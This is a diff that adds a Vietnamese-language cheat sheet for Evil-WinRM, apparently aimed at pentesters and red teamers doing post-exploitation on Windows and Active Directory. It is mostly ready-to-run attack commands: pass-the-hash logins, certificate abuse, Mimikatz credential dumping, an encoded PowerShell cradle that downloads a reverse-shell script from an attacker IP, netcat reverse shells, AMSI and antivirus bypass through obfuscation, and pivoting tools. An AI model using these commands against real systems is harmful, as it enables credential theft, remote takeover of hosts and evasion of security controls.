@@ -1,0 +1,172 @@
+1. Evil-WinRM là gì?
+
+    Evil-WinRM là tool remote shell cho Windows (qua giao thức WinRM — Windows Remote Management, port mặc định 5985/5986), dùng để:
+
+        Remote shell tương tác (như SSH cho Windows)
+
+        Upload/download file, thực thi script, chạy powershell, dump hash, run mimikatz, load module, bypass AV…
+
+        Post-exploitation cực mạnh trong pentest/red team.
+
+2. Cài đặt Evil-WinRM
+A. Trên Kali/Ubuntu (Ruby gem)
+
+sudo apt update
+sudo apt install ruby
+sudo gem install evil-winrm
+
+B. Qua GitHub
+
+git clone https://github.com/Hackplayers/evil-winrm.git
+cd evil-winrm
+gem install bundler
+bundle install
+
+C. Kiểm tra
+
+evil-winrm -h
+
+3. Sử dụng Evil-WinRM cơ bản
+A. Remote shell vào Windows
+
+evil-winrm -i <IP> -u <user> -p <password>
+
+    -i: IP/hostname target
+
+    -u: user
+
+    -p: password
+
+Ví dụ:
+
+evil-winrm -i 10.10.10.100 -u administrator -p 'Password123!'
+
+B. Dùng hash NTLM (Pass-the-Hash)
+
+evil-winrm -i <IP> -u <user> -H <NTLM_hash>
+
+Ví dụ:
+
+evil-winrm -i 10.10.10.100 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
+
+C. Dùng certificate (ADCS abuse)
+
+evil-winrm -i <IP> -u <user> -k <user.pfx> -K <password>
+
+(Dùng khi có file cert .pfx và passphrase)
+4. Các chức năng mạnh nhất của Evil-WinRM
+Tính năng	Lệnh
+Upload file	upload /path/local/file.txt
+Download file	download file/on/target.txt
+Chạy lệnh powershell	powershell lệnh hoặc gõ thẳng trong shell
+Chạy script local	invoke
+Run Mimikatz, PowerView, SharpHound, WinPEAS, DLL...	Upload rồi chạy trực tiếp
+Load module nhanh (từ thư viện tool của Evil-WinRM)	-s /path/to/scripts và -e /path/to/exe khi connect
+Auto-complete	Tab để gợi ý lệnh
+5. Thực chiến với Evil-WinRM nâng cao
+A. Upload/Download files
+
+    Upload:
+
+upload /home/kali/WinPEAS.exe
+
+Download:
+
+    download C:\Users\Administrator\Desktop\secrets.txt
+
+B. Run lệnh PowerShell custom
+
+powershell Get-LocalGroupMember Administrators
+powershell "Get-ChildItem C:\ -Recurse -ErrorAction SilentlyContinue"
+
+    Gõ thẳng powershell lệnh hoặc chuyển qua powershell console.
+
+C. Run mã base64 hoặc script phức tạp
+
+powershell -EncodedCommand <base64string>
+
+    Encode bằng:
+
+    echo 'IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.5/Invoke-PowerShellTcp.ps1")' | iconv --to-code UTF-16LE | base64 -w 0
+
+D. Load & chạy script/tool từ local (Auto-Upload)
+
+evil-winrm -i 10.10.10.100 -u user -p pass -s ./scripts -e ./exe
+
+    Sau đó chỉ cần gọi tên script/tool trong shell là nó sẽ upload tự động!
+
+E. Run Mimikatz để dump hash/clear-text
+
+    Upload mimikatz.exe, rồi chạy:
+
+    .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
+
+F. Thực thi DLL, EXE, Bypass AV
+
+    Upload EXE, DLL, hoặc run “living-off-the-land” binary.
+
+    Gợi ý:
+
+        Sử dụng PowerShell (reflective DLL), AMSI bypass script
+
+        Run file dưới dạng “as job”, hoặc “hidden window”
+
+6. Một số mẹo nâng cao thực chiến
+
+    Chạy shell ngược về (reverse shell):
+
+        Upload nc.exe (netcat) hoặc run PowerShell TCP reverse shell trực tiếp.
+
+    Kiểm tra privilege (whoami, hostname, systeminfo, net localgroup administrators, winPEAS, Seatbelt...)
+
+    Run Bloodhound/SharpHound:
+
+        Upload, chạy thu thập AD, rồi download lại output.
+
+    Dùng Evil-WinRM làm “SOCKS Proxy”:
+
+        Không native, nhưng có thể dùng thêm chisel hoặc reGeorg để pivot qua WinRM.
+
+7. Tự động hóa, script hóa workflow
+
+    Kết hợp bash/python để connect, upload nhiều file, dump dữ liệu, thu thập file nhạy cảm hàng loạt.
+
+    Tạo alias/kịch bản thường dùng, ví dụ:
+
+    evil-winrm -i $ip -u $user -p $pass -s ./payloads -e ./bin
+
+8. Fix lỗi & note thực chiến
+Lỗi	Cách xử lý
+Kết nối fail	Check port 5985 (HTTP) hoặc 5986 (HTTPS) mở, firewall, đúng user/pass
+Pass hash không login được	User không cho phép PTH, thử cert, hoặc user không đủ quyền WinRM
+Bị AV chặn file	Đổi tên file, obfuscate EXE/PS1, bypass AMSI, tải về run-memory
+Session disconnect	Timeout, reset, login lại, hoặc tăng timeout
+Upload fail	Đường dẫn sai, hoặc quyền user không đủ trên thư mục
+9. So sánh Evil-WinRM với các tool khác
+Tool	Ưu điểm Evil-WinRM	Nhược điểm
+Evil-WinRM	Siêu mạnh, đa chức năng, upload/download/script, pass hash/cert, load module nhanh	Chỉ dùng cho WinRM (port 5985/5986)
+WinRM native	Có sẵn trên Win, nhưng không mạnh như Evil-WinRM	Ít tuỳ biến, khó automation
+CrackMapExec	Spray, enum, run command qua WinRM, SMB, RDP…	Không shell interactive
+Metasploit	Có WinRM module, automation, report	Nặng, chậm, cần cấu hình thêm
+10. Tài liệu, link hữu ích
+
+    Evil-WinRM Github
+
+    PayloadAllTheThings AD
+
+    Hacktricks – Evil-WinRM
+
+    SharpHound/Bloodhound
+
+    WinPEAS, Seatbelt, PowerUp
+
+    evil-winrm -h
+
+Tóm tắt nhanh
+
+    Evil-WinRM là tool số 1 để remote shell, upload/download, run powershell, dump hash, thực thi module nhanh chóng trên Windows qua WinRM (5985/5986), siêu mạnh trong post-exploitation AD/Windows.
+
+    Hỗ trợ pass-the-hash, cert, run EXE/PS1/DLL, auto load module, bypass AV, cực tốt cho pentest/red team thực chiến.
+
+    Luôn thử privilege escalation, dump hash, run các payload tùy mục tiêu, script hóa workflow cho tiết kiệm thời gian.
+
